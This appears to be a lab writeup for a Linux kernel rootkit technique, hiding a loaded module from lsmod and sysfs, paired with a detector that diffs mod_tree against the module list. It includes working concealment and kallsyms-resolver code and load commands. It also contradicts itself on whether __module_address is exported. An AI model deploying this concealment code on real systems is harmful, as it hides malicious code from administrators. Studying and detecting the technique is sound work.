# 01 — Module-list concealment

_Stage 1 of the shadowfox + lighthouse project. Paired writeup for
the offensive technique implemented in `modules/shadowfox/` and the
detection counterpart in `modules/lighthouse/`._

> **Status.** Built and smoke-tested on the lab VM against kernel
> `6.6.138-0606138-generic`. Both list-only (default) and full-
> surface ("permanent_hide=1") modes verified end-to-end.

---

## 1. Overview

Linux exposes the set of loaded modules through several independent
surfaces — a global linked list, per-module sysfs kobjects, and a
kernel-internal RB-tree used for fast address lookups. Userspace
tools (`lsmod`, `cat /proc/modules`, `ls /sys/module/`) read the
first two; the kernel itself relies on the third for things like
address attribution in stack traces. The shadowfox module unlinks
itself from the kernel's `modules` linked list — making it invisible
to `lsmod` and `/proc/modules` — while deliberately leaving its
`mod_tree` entry intact, and (for reasons covered in section 3)
also leaving its `/sys/module/<name>` kobject alone. The lighthouse
detector exploits the list-vs-mod_tree asymmetry: it enumerates
loaded modules via `__module_address()` (kallsyms-resolved) and via
a direct `mod_tree` walk, both of which see shadowfox, and diffs
against the linked list — anything present in the address-derived
view but missing from the list is flagged as concealed.

## 2. Kernel internals involved

### The `modules` linked list

The kernel keeps a doubly-linked list of every loaded `struct module`,
rooted at the global symbol `modules` (defined in
`kernel/module/main.c`):

```c
static LIST_HEAD(modules);
```

Each loaded module is on this list via its `list` field. The list
is serialised by a sibling symbol, `module_mutex`. Two publicly
observable consumers walk it:

1. `/proc/modules` — `m_show()` in `kernel/module/procfs.c` iterates
   the list and prints each module's name, size, and refcount.
   `lsmod` is a thin wrapper over reading that file.
2. `find_module(name)` — does a strcmp scan of the same list. This
   is what `delete_module(2)`, the syscall behind `rmmod`, uses to
   locate the target. Critically, **if a module is not on the list,
   `rmmod` cannot find it.**

Both `modules` and `module_mutex` are static-with-external-linkage —
not exported, but indexed by kallsyms.

### The per-module sysfs kobject

Each loaded module also gets a kobject at `/sys/module/<name>`. The
kobject lives at `module->mkobj.kobj` and is parented under the
global `module_kset` (whose own kobject is `/sys/module/` itself).
Sysfs walks `module_kset`'s child list to render the directory;
removing our kobject removes us from that walk and the entry
disappears from the filesystem.

### `mod_tree` — the surface we leave alone

`kernel/module/internal.h` defines:

```c
struct mod_tree_root {
#ifdef CONFIG_MODULES_TREE_LOOKUP
    struct latch_tree_root root;
#endif
    unsigned long addr_min;
    unsigned long addr_max;
#ifdef CONFIG_MODULES_TREE_LOOKUP
    unsigned long data_addr_min;
    unsigned long data_addr_max;
#endif
};

struct mod_tree_root mod_tree;
```

The kernel uses this RB-tree to answer "which module owns address
X?" in O(log N). The tree also backs the exported `__module_address()`
function, which is the detector's primary primitive. shadowfox never
touches `mod_tree`; that creates the cross-view asymmetry the
detector exploits.

The struct definition above is **kernel-internal** — not visible to
out-of-tree modules. The detector replicates the layout in
`modules/lighthouse/kernel_internal.h`, pinned to the 6.6 ABI.

### `kallsyms_lookup_name` post-5.7

Two of the symbols above (`modules`, `module_mutex`) are not exported
to out-of-tree modules. Pre-5.7 we could call `kallsyms_lookup_name()`
to resolve them; that symbol was unexported in commit `0bd476e6c671`
("kallsyms: unexport kallsyms_lookup_name() and
kallsyms_on_each_symbol()"). The standard workaround — registering a
kprobe on the symbol name and reading `kp.addr` before the probe
fires — gives us back the function pointer.

## 3. Implementation walkthrough (shadowfox side)

The entire concealment technique is a few dozen lines under
`modules/shadowfox/hide_module.c`. Two entry points — `sf_hide()`
and `sf_restore()` — each idempotent, each guarded by `module_mutex`.

### Resolving the kernel symbols we need

```c
static int resolve_kallsyms_lookup_name(void)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
        .pre_handler = sf_noop_pre,
    };
    int ret = register_kprobe(&kp);
    if (ret < 0)
        return ret;

    sf_kallsyms_lookup_name = (void *)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}
```

The kprobe is registered, the address is read from `kp.addr` (which
the kprobe core fills in during registration), and the probe is
unregistered before it ever fires. Through the resulting function
pointer we resolve `modules` and `module_mutex`.

### Hide: list unlink (+ optional sysfs)

`sf_hide(bool permanent)` always unlinks from the modules list and,
when `permanent` is set, additionally calls `kobject_del()` on
`THIS_MODULE->mkobj.kobj`. The mode is chosen at hide-time and
recorded so that `sf_restore()` can refuse a non-recoverable
restore.

```c
int sf_hide(bool permanent)
{
    mutex_lock(sf_module_mutex);
    if (sf_hidden) {
        mutex_unlock(sf_module_mutex);
        return 0;
    }

    sf_saved_prev = THIS_MODULE->list.prev;
    list_del_init(&THIS_MODULE->list);

    if (permanent) {
        kobject_del(&THIS_MODULE->mkobj.kobj);
        sf_hidden_permanently = true;
    }

    sf_hidden = true;
    mutex_unlock(sf_module_mutex);
    return 0;
}
```

We snapshot `THIS_MODULE->list.prev` before `list_del_init` zeroes
the link, so restore can re-insert at the original position rather
than at the head. The snapshot is only consulted in non-permanent
mode.

### Restore: re-link (or refuse)

```c
int sf_restore(void)
{
    mutex_lock(sf_module_mutex);
    if (!sf_hidden) {
        mutex_unlock(sf_module_mutex);
        return 0;
    }
    if (sf_hidden_permanently) {
        mutex_unlock(sf_module_mutex);
        return -EPERM;
    }

    list_add(&THIS_MODULE->list, sf_saved_prev);

    sf_hidden = false;
    mutex_unlock(sf_module_mutex);
    return 0;
}
```

In permanent mode, `sf_restore()` refuses with `-EPERM` and emits a
`pr_warn` explaining that the module is unloadable until reboot.

### Scope choice: two modes, one trade-off

`kobject_del()` recursively destroys the kobject's child entries
(`holders/`, `refcnt`, `sections/`, `parameters/`). A bare
`kobject_add()` only re-creates the parent: the children are built
by the kernel's module loader (`mod_sysfs_setup()`), not by kobject
machinery, and there is no public API for an out-of-tree module to
repopulate them. The first draft of Stage 1 paired `kobject_del`
with `kobject_add` on restore, and observed two failures on 6.6.138:

1. `libkmod`'s `rmmod` wrapper refused the unload — it pre-checks
   `/sys/module/<name>/holders` and bails with "Module unloading is
   not supported."
2. The eventual `delete_module(2)` (via direct syscall) succeeded,
   but `mod_sysfs_teardown()` emitted two `WARN_ON_ONCE` traces
   from `sysfs_remove_group()` on the missing `sections/` and
   `parameters/` groups.

These break the "load, hide, unhide, unload" demo loop. They do not
break the "load, hide, never unload" demo — which is exactly
Diamorphine's stance.

shadowfox therefore exposes both options behind a load-time
parameter, with the default chosen for a clean demo loop:

| Mode                     | List hidden | /sys/module hidden | Restore possible | Clean rmmod |
|--------------------------|-------------|--------------------|------------------|-------------|
| default (`permanent_hide=0`) | yes      | no                 | yes              | yes (after restore) |
| `permanent_hide=1`           | yes      | yes                | no (-EPERM)      | no — reboot required |

The detector logic is the same against either mode: it doesn't care
which userspace surfaces were hidden, only that `mod_tree` and the
modules list disagree.

Restoring sysfs visibility after a `permanent_hide=1` is left out
of scope for Stage 1. Doing it properly is a Stage 6 (integrity-
layer) problem because it requires either mirroring
`mod_sysfs_setup`'s child-kobject construction from an out-of-tree
module, or hooking into kernel internals.

### Selecting the mode at load time

Both modes are wired through the same debugfs control file. The
mode is chosen at `insmod` time via a module parameter, not at
runtime — switching modes mid-lifecycle would require careful state
management that is not justified for the educational scope.

```
# List-only hide (default, restorable)
sudo insmod shadowfox.ko
echo hide   | sudo tee /sys/kernel/debug/shadowfox/ctl
echo unhide | sudo tee /sys/kernel/debug/shadowfox/ctl
sudo rmmod shadowfox

# Full-surface, permanent (Diamorphine mode)
sudo insmod shadowfox.ko permanent_hide=1
echo hide   | sudo tee /sys/kernel/debug/shadowfox/ctl
# unhide refused, rmmod refused — reboot to recover.
```

### The debugfs side channel

Because `find_module()` walks the list we just unlinked from,
`rmmod shadowfox` fails with `-ENOENT` while we are hidden. The user
needs a way to issue "unhide" without referring to the module by its
list position. The fix: a debugfs entry rooted independently of
`/sys/module`:

```
/sys/kernel/debug/shadowfox/ctl
```

`debugfs_create_dir()` is rooted at the global debugfs tree, not at
the per-module kobject, so it stays reachable while the module is
hidden. Writes accept `hide`, `unhide`, or `restore`. The `hidden`
module parameter (default `0`) lets `insmod shadowfox.ko hidden=1`
hide-on-load for one-shot demos.

## 4. Kernel version compatibility matrix

| Kernel        | Status                  | Notes                                                                                          |
|---------------|-------------------------|------------------------------------------------------------------------------------------------|
| < 5.7         | Should work (untested)  | `kallsyms_lookup_name()` is `EXPORT_SYMBOL_GPL` — kprobe trick unnecessary.                    |
| 5.7 – 6.3     | Should work (untested)  | kprobe trick required. `struct module` layout matches 6.6 for the fields we touch.             |
| **6.6 LTS**   | **Target**              | Pinned: `6.6.138-0606138-generic` (Ubuntu mainline-builds, build 202605080820).                |
| 6.4 – 6.7     | Likely works            | `mod_tree` layout reorganised between releases; re-verify `kernel_internal.h` against new defs. |
| 6.8+          | Unverified              | Kbuild module layout fields (`mod->mem[]`) reworked. mod_tree walker may need updates.         |

The address-scan detector is the most forward-portable piece: as
long as `__module_address()` stays exported, that half keeps working
even when `kernel_internal.h` goes stale.

## 5. Detection counterpart

Detection lives in `modules/lighthouse/detect.c`. A single call to
`lh_detect_hidden_modules()` builds three sets of `struct module *`
and diffs them.

### `visible_set` — walk the modules list

```c
mutex_lock(lh_module_mutex);
list_for_each_entry(mod, lh_modules_head, list)
    set_add(set, mod);
mutex_unlock(lh_module_mutex);
```

This is the surface shadowfox attacks. A concealed module is not in
this set; a normal module is.

### `addr_set` — `__module_address()` scan

```c
for (addr = MODULES_VADDR; addr < MODULES_END; addr += PAGE_SIZE) {
    preempt_disable();
    mod = __module_address(addr);
    preempt_enable();
    if (mod) set_add(set, mod);
    cond_resched();
}
```

`__module_address()` is `EXPORT_SYMBOL_GPL`. Internally it does an
RB-tree lookup against `mod_tree`. Because shadowfox does not unlink
itself from `mod_tree`, every page-aligned address that maps to
shadowfox memory returns a valid `struct module *`.

Stepping by `PAGE_SIZE` over the ~1.5 GB x86_64 module region is
~400K iterations — expected to complete in well under 50 ms even on
the TCG-emulated lab VM. The preempt window is narrow (one RB-tree
lookup); `cond_resched()` between iterations keeps the scan
latency-friendly.

### `tree_set` — direct `mod_tree` walk

```c
for (rbn = rb_first(&lh_mod_tree->root.tree[0]); rbn;
     rbn = rb_next(rbn)) {
    struct latch_tree_node *ltn =
        container_of(rbn, struct latch_tree_node, node[0]);
    struct mod_tree_node *mtn =
        container_of(ltn, struct mod_tree_node, node);
    set_add(set, mtn->mod);
}
```

This uses the replicated struct layout in `kernel_internal.h`. It
demonstrates direct inspection of an internal kernel data structure
— pedagogically richer than the `__module_address()` path, but
tightly coupled to the 6.6 ABI.

Compiled out under `#ifdef CONFIG_MODULES_TREE_LOOKUP=n`. Modern
distro kernels enable it by default (auto-selected by `TRACING`,
`PERF_EVENTS`, etc.).

### Diff and disagreement

For every module in `addr_set` or `tree_set` that is not in
`visible_set`, lighthouse emits:

```
lighthouse: hidden module detected via __module_address: shadowfox
lighthouse: hidden module detected via mod_tree: shadowfox
```

Both methods should agree on the same hidden set. If they don't:

```
lighthouse: detector disagreement: __module_address=N mod_tree=M ...
```

A disagreement is itself a signal — it would imply a more advanced
concealment that targets one tree but not the other (a plausible
direction for future technique work).

## 6. Real-world references

- **Diamorphine** — Linux kernel rootkit by m0nad,
  [github.com/m0nad/Diamorphine](https://github.com/m0nad/Diamorphine).
  Original educational demo of the `list_del` / `kobject_del`
  concealment, still maintained for current kernels. Does not
  implement restore — once hidden, only reboot unloads it.
- **Reptile** — Linux kernel rootkit by f0rb1dd3n,
  [github.com/f0rb1dd3n/Reptile](https://github.com/f0rb1dd3n/Reptile).
  Same concealment with a hide/unhide toggle (closer to our pattern).
  Reads in this project drew from its kallsyms-resolver structure.
- **suterusu** — Older educational rootkit; foundation for many
  later designs.
- **LWN.net** — "Replacing kallsyms_lookup_name()" coverage of the
  5.7 unexport (commit `0bd476e6c671`), and the broader articles on
  the loaded-module data structures. Search by title rather than
  guessing article IDs.
- **Phrack** — Issue 68 includes early discussion of Linux LKM
  concealment via `list_del`; foundational reading for the
  technique's history.
- **Linux kernel source** — `kernel/module/main.c`,
  `kernel/module/internal.h`, `kernel/module/tree_lookup.c`,
  `include/linux/rbtree_latch.h`. Definitive references for the
  structures touched. Browseable on
  [elixir.bootlin.com](https://elixir.bootlin.com/linux/v6.6).
- **Volatility framework** — `volatility3`'s `linux.lsmod` plugin
  performs the equivalent of the cross-view diff implemented here,
  but on a captured memory image rather than on a live system.

## 7. Mitigations

Defensive controls that block, hinder, or detect this technique:

- **`CONFIG_MODULE_SIG_FORCE=y` (module signature enforcement)** —
  Unsigned modules cannot be loaded. shadowfox would need to be
  signed with a trusted key, taking it out of the realm of
  out-of-tree research code.
- **Secure Boot + `CONFIG_LOCKDOWN_LSM`** — Lockdown in
  `confidentiality` or `integrity` mode disables `/dev/kmem`,
  kprobes, `/dev/mem`, and several other primitives. The kprobe
  trick used to resolve `kallsyms_lookup_name` fails outright.
- **`CONFIG_KPROBES=n`** — Same effect for the resolver path,
  without needing Lockdown.
- **`CONFIG_STRICT_MODULE_RWX=y`** — Doesn't block list_del, but
  prevents subsequent text patching that more advanced techniques
  layer on top.
- **AppArmor / SELinux module-load policies** — Restrict which
  processes may invoke `init_module(2)`, narrowing the load surface.
- **Periodic cross-view auditing** — Effectively what lighthouse
  does on a recurring trigger. A production deployment would run as
  a kthread or integrate with auditd; the educational version runs
  on demand via debugfs.
- **Live forensic tools** — `lsmod` won't catch a hidden module,
  but `volatility3`'s `linux.check_modules` plugin and `gdb`
  against `/proc/kcore` will.

## 8. Lessons learned

Things that would have caught us out if we'd skipped the design
walkthrough:

- **`kobject_del()` recursively destroys children that out-of-tree
  code cannot rebuild.** The first draft of this technique paired
  `list_del` with `kobject_del` on `mkobj.kobj` unconditionally. The
  hide step worked; the restore step did not — `kobject_add()` only
  resurrects the parent, and the children (`holders/`, `refcnt`,
  `sections/`, `parameters/`) are built by the kernel's module
  loader and are not addressable from an out-of-tree restore path.
  Consequences: `libkmod` refused `rmmod`, and direct
  `delete_module(2)` emitted two `WARN_ON_ONCE` traces during
  cleanup. Resolution: the full-surface hide is now an opt-in via
  `permanent_hide=1`, paired with an explicit "no restore, reboot
  to unload" stance. Default mode hides only the list. See section
  3.
- **`rmmod` walks the same list we unlinked from.** Hiding makes
  the module unloadable through the normal path. We needed an
  out-of-band trigger (debugfs at a root path) to issue restore.
  This is also why Diamorphine famously cannot be unloaded once
  hidden — they don't ship the side channel.
- **`module_mutex` is the right granularity for the offense AND
  the detector.** Both need the same snapshot; both take the lock.
  No AB-BA potential because we create debugfs entries before
  taking the mutex.
- **`__module_address()` is NOT exported in 6.6** (despite being
  declared in `<linux/module.h>`). The first draft of lighthouse
  assumed it was `EXPORT_SYMBOL_GPL` and failed at modpost:
  `"__module_address" [...] undefined!`. Fix: resolve it via
  kallsyms exactly like every other private symbol, store the
  function pointer in `lh_module_address`, and call through that.
  The detector logic is unchanged; only the binding mechanism
  shifts. Worth flagging up front for any reader who skims the
  in-kernel header and assumes the prototype means "public API."
- **The `CONFIG_MODULES_TREE_LOOKUP` `#ifdef` matters.** On a
  config-stripped kernel without `TRACING`/`PERF_EVENTS`, the
  `latch_tree_root` field in `mod_tree_root` is gone — referencing
  it would be a compile error, not a runtime bug. The guards in
  `kernel_internal.h` and `detect.c` keep the module portable to
  such kernels at the cost of having only the address-scan detector
  active there.
- **`__module_address()` lock assertion.** It calls
  `module_assert_mutex_or_preempt()` internally — `rcu_read_lock()`
  alone is not enough. `preempt_disable()` around the call (or
  holding `module_mutex` for the duration of the scan) is the
  documented contract. Narrow `preempt_disable` is the cheaper
  choice.

---

_Next technique: Stage 2 — `cred`-modification helper paired with a
cred-state detector._
